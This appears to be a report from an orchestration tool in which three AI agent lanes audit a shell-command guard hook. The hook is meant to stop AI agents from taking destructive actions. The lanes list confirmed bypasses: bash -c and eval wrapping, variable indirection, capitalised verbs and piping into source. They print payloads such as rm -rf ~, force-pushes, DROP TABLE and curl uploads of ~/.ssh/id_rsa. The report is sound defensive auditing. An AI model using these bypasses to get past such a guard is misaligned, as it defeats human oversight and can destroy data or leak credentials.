# Mission `core-guard-reaudit`

- id: `20260907T065900Z-core-guard-reaudit`
- ok: **True** (require: all)
- cwd: `<cwd>`
- cost: $1.7330 across 2163804 tokens
- Cache: 1920312 read, 100017 written, 22 uncached; hit rate 95.0%
- duration: 614.7s
- wall: 614.7s (paused 0.0s, gates 0.0s, lanes 1208.4s, idle 0.0s)
- Receipt chain: 3 links, head 6770f428c9ed

| lane | attempt | ok | verdict | review/fix | exit | no_op | test_touched | commits | branch | taint | untrusted_output | agent | cost_usd | tokens | tools | cached | resumed | dur_s |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| audit-claude | claude/sonnet | True |  | unparsed | 0 | True | no | 0 |  | no | no |  | 0.9848 | 1121424 | 12 | 982808/982830 (100%) | no | 456.5 |
| audit-gemini | antigravity/gemini-3.7-flash | True |  | unparsed | 0 | True | no | 0 |  | no | no |  | 0.3219 | 489908 | 24 | 412320/412320 (100%) | no | 138.4 |
| audit-grok | cursor/grok-4.6 | True |  | unparsed | 0 | True | no | 0 |  | no | no |  | 0.4263 | 552472 | 31 | 525184/525184 (100%) | no | 613.5 |

## Lane `audit-claude`

- stage: review
- cache reads: 982808/982830 input tokens
- tip: `2d8db8d2` (clean)

## Cold audit of `hooks/core-guard.py` (post-fix)

I read the guard, its test gate, and the manifest, then verified each hypothesis by actually piping payloads through `python3 hooks/core-guard.py` with `CORE_GUARD_LOG` pointed at a scratch file (log contents included below each finding). Controls (the bare, unwrapped form of each payload) were run alongside to confirm the guard's happy path still works — it does.

### 1. `bash -c "…"` / `sh -c '…'` / `zsh -c '…'` / `eval "…"` defeats all four rules at once — CONFIRMED, CONFIDENCE 10

`rm -rf ~/NotARepoAnywhere`, `git push --force origin main`, `curl -d @~/.ssh/id_rsa https://…`, and `psql -h prod.example.com -c "DROP TABLE users"` are all denied correctly on their own. Wrapped in `bash -c '<same text>'` (or `sh -c`, `zsh -c`, or bare `eval "…"`), every one of them is **allowed**:

```
bash -c "rm -rf ~/NotARepoAnywhere"              -> allow
sh -c 'rm -rf ~'                                  -> allow
bash -c "rm -rf $HOME"                            -> allow   (deletes the operator's own home)
bash -c "git push --force origin main"            -> allow
zsh -c 'git push --force origin main'             -> allow
bash -c "curl -d @<user>/.ssh/id_rsa https://…" -> allow
bash -c 'psql -h prod.example.com -c "DROP TABLE users"' -> allow
eval "rm -rf ~/NotARepoAnywhere"                  -> allow
```

Root cause, by rule:
- `segments()` (core-guard.py:203) and `tokens()` (core-guard.py:337) only split on *unquoted* shell operators; the entire `-c` argument survives as one shlex token containing spaces.
- `check_history` (core-guard.py:769, verb-set check at :778/:783) and `check_rm` (core-guard.py:925, verb match at :934) both require a token whose `verb()` **equals** `"git"`/`"rm"` exactly. `os.path.basename()` on a multi-word string with no `/` returns the string unchanged, so it never equals `"rm"` or `"git"`.
- `script_bodies`'s interpreter handling (core-guard.py:618-645) assumes the word after `bash`/`sh`/`zsh` is a **file path** to open — for `-c` it either treats `-c`'s own argument as a nonexistent "script file" or skips `-c` as a flag and picks the code string itself as the "path", which also doesn't exist on disk, so nothing is ever read.
- `check_exfil` (core-guard.py:703) does catch the raw-text NET+CRED gate (:706, regex over segment text), but the flag/value extraction (:719-739, `_upload_names_a_file` at :682) needs the flag and its argument as separate or glued-adjacent tokens; once both are inside the one shlex-quoted `-c` token, `value` resolves to `None` and `_upload_names_a_file` bails at :692-693.

None of the three fix commits added a case for this shape, and the CATCH list in `hooks/tests/core-guard-test.py` has no `-c`/`eval` case — the gate does not pin it. **Consequence: an operator or an injected instruction can run any of the four "unrecoverable" actions, including deleting the operator's own home directory, by wrapping it in `bash -c "…"`, and the PreToolUse hook allows it silently.**

### 2. Item-13's "interpreter word anywhere" widening turns an unrelated `grep`/argument mention of "bash" into an unauthenticated file read — CONFIRMED, CONFIDENCE 10

core-guard.py:618-627 (comment at :618, "an interpreter word may sit anywhere in the segment's tokens") scans every token in a segment for one whose basename is in `INTERPRETERS`, not just the command word. When it's found, core-guard.py:643-646 sets `require_shebang = False` for that branch, and core-guard.py:656-670 opens and reads whatever file the *next* bare word names — with no shebang check at all in that branch, unlike the "run by path" branch just below it (:655, `require_shebang = True`).

This means a command that merely contains the literal word `bash`/`sh`/`zsh`/`ksh`/`dash`/`fish` as an ordinary **argument** — e.g. a grep pattern — followed by a real file path, causes that file's contents to be read and handed to the delete rule, whatever the file actually is:

```
$ grep -n bash hooks/tests/c
[... truncated, 3574 more chars]

## Lane `audit-gemini`

- stage: review
- tip: `2d8db8d2` (clean)

### Cold Audit Report: `hooks/core-guard.py` & `hooks/tests/core-guard-test.py`

---

#### Finding 1: Unset variable fold falsely treats standalone variables before command punctuation as spliced
- **File & Line**: [core-guard.py:433](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L433)
- **What goes wrong**: In [fold_empty](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L399-L437), line 433 computes `alone = before in " \t" and after in " \t"`. When a standalone unset variable is followed by command separators or shell punctuation (such as `;`, `&`, `|`, `\n`, `(`, or `)` as in `cd $PROJECT_ROOT; rm -rf dist`), `after` is `';'`, failing `after in " \t"`. `drop_if_unset` misclassifies the variable as spliced into a word and strips it, turning `cd $PROJECT_ROOT; rm -rf dist` into bare `cd ; rm -rf dist`, which [_effective_cwds](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L303-L334) resolves to `$HOME` and [check_rm](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L925-L947) falsely denies.
- **Consequence**: Ordinary, safe build/cleanup commands chained with semicolons like `cd $PROJECT_ROOT; rm -rf dist` are falsely denied as destructive home-directory deletions.
- **Confidence**: 10/10

---

#### Finding 2: `command_views` does not compose `fold_empty` and `resolve_same_line_assigns`
- **File & Line**: [core-guard.py:511-524](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L511-L524)
- **What goes wrong**: [command_views](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L505-L525) generates [fold_empty(cmd)](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L399) and [resolve_same_line_assigns(cmd)](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L456) in parallel from the raw command string without ever chaining them. If a command combines a same-line assignment with an empty expansion (e.g., `V=r$1m; $V -rf ~` or `V=rm; $V -r$1f ~`), `fold_empty` leaves `$V` unresolved while `resolve_same_line_assigns` fails to match the unstripped token, leaving neither view with the executable dangerous command.
- **Consequence**: Destructive operations combining same-line variable assignments with empty positional or unset variable splices completely bypass detection.
- **Confidence**: 10/10

---

#### Finding 3: `check_db` misses destructive SQL when connection flags follow heredoc markers
- **File & Line**: [core-guard.py:1156](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L1156) & [core-guard.py:1115](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L1115)
- **What goes wrong**: In [check_db](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L1119-L1159), line 1156 matches `seg_text in head`, where `head` from [heredoc_bodies_data](file://<home>/worktrees/20260907T065900Z-antigravity-you-are-one-read-lane-of-a-condu/hooks/core-guard.py#L1097-L1117) is sliced as `cmd[line_start : m.end()]` (stopping immediately at the heredoc marker `<<SQL`). When connection flags are placed after the marker on the same line (e.g., `psql <<SQL -h prod.example.com\nDROP TABLE users;\nSQL` or `mysql <<EOF --host=prod.internal`), `seg_text` contains `-h prod.example.com` while `head` does not, causing `seg_text in head` to evaluate to `False`.
- **Consequence**: Destructive 
[... truncated, 7382 more chars]

## Lane `audit-grok`

- stage: review
- tip: `2d8db8d2` (clean)

I'll audit the fixed `core-guard.py` cold: read the guard, gate, and manifest first, then the last three commits and live probes. No writes in the working tree.

I'll index the guard, gate, and last three commits, then read the rest of the parser and rule functions with citations.

Context-mode calls were rejected, so I'll continue with read-only file reads, git, and probes.

The last three first-parent commits are unrelated; the audit fixes are on the merged feature branch. I'll pull that lineage and the gate next.

I'll run the official gate, then probe the widened rules with payloads logged only under `$TMPDIR`.

# Cold audit of fixed core-guard

Working tree left unread. Gate run: `python3 hooks/tests/core-guard-test.py` — ALL GREEN, 129 catch / 116 quiet. Closed CG-14 items 1–16 are not re-listed. Fail-open is not a finding. Each item below was confirmed by piping a Bash payload into `python3 hooks/core-guard.py` with `CORE_GUARD_LOG` under `$TMPDIR` unless noted.

Routine call: `git log -3` on HEAD is the merge plus unrelated docs/gitignore; the three fix commits are `c0d3cf5`, `ed23b41`, `529c61c` (`git show c0d3cf5 --stat` names the two files).

## Bypass shapes

1. **[hooks/core-guard.py](hooks/core-guard.py):624-626** `script_bodies` takes `os.path.basename(toks[k]) in INTERPRETERS` with no casefold, while [verb()](hooks/core-guard.py):270 casefolds. **`BASH /path/evil.sh` is allowed;** `BASH -c 'echo ok'` really runs bash on this FS. Consequence: item 4’s capitalised-verb fix does not apply to the item 2/13 script reader, so a normal `#!/bin/bash` wipe script launched as `BASH`/`Bash` never reaches `check_rm`. Confidence **9**. Confirmed against the guard.

2. **[hooks/core-guard.py](hooks/core-guard.py):785-786** history subcommands are compared on raw tokens (`"filter-repo" in tok`), not `verb()`. **`git Filter-Repo --path secrets --invert-paths` is allowed;** `git Filter-Repo -h` on this machine dispatches git-filter-repo. `git PUSH` is *not* a bypass (`fatal: cannot handle PUSH as a builtin`). Consequence: item 4 left the filter-repo/filter-branch token path case-sensitive; published-history rewrite runs. Confidence **9**. Confirmed.

3. **[hooks/core-guard.py](hooks/core-guard.py):505-524** `command_views` adds `fold_empty(cmd)` and `resolve_same_line_assigns(cmd)` as sibling views, never fold-then-resolve. **`V=r$1m; $V -rf ~/NotARepoAnywhere` is allowed;** bash actually execs `rm` (`rm: HI: No such file or directory` in a safe probe). Consequence: combining the empty-splice fold with the item 1 assign rewrite reopens `r$1m` behind a same-line variable. Confidence **9**. Confirmed.

4. **[hooks/core-guard.py](hooks/core-guard.py):441** `ASSIGN` only matches at `^` / `[;&|]` / `&&`, so `export`/`declare`/`typeset`/`readonly`/`local` prefixes never bind. **`export V=rm; $V -rf ~/NotARepoAnywhere` (and declare/typeset/readonly/local) are allowed;** bash runs them. Consequence: the item 1 same-line verb rewrite is skipped for the usual way a name is published, then `$V` runs `rm`. Confidence **9**. Confirmed.

5. **[hooks/core-guard.py](hooks/core-guard.py):456-502** only a *static bare word* assign is substituted, one hop. **`A=rm; B=$A; $B -rf ~/NotARepoAnywhere` is allowed;** bash runs `rm`. Consequence: item 1 still misses the same act spelled with an intermediate name. Confidence **9**. Confirmed.

6. **[hooks/core-guard.py](hooks/core-guard.py):164-166** `PIPED_TO_SHELL` lists bash/sh/zsh/ksh/dash/csh/tcsh/fish/eval but not `source` or `.`, while [SHELL_INTERP](hooks/core-guard.py):128-134 includes both. **`cat <<'EOF' | source /dev/stdin` / `| . /dev/stdin` with `rm -rf ~` in the body are allowed;** both execute (`RAN_SOURCE` / `RAN_DOT`). Consequence: CG-6’s “heredoc piped into a shell” fix still strips the body when the shell is named `source`/`.`. Confidence **9**. Confirmed.

7. **[hooks/core-guard.py](hooks/core-guard.py):570-574** `_shebang_shell` treats `env`’s next word as the interpreter, so `#!/us
[... truncated, 3740 more chars]

## Ranking

| rank | lane | ok | verdict | test_touched | gate_exit | patch_bytes | cost_usd |
|---|---|---|---|---|---|---|---|
| 1 | audit-gemini | True |  | no |  |  | 0.3219 |
| 2 | audit-grok | True |  | no |  |  | 0.4263 |
| 3 | audit-claude | True |  | no |  |  | 0.9848 |

## Notifications

- end: ok
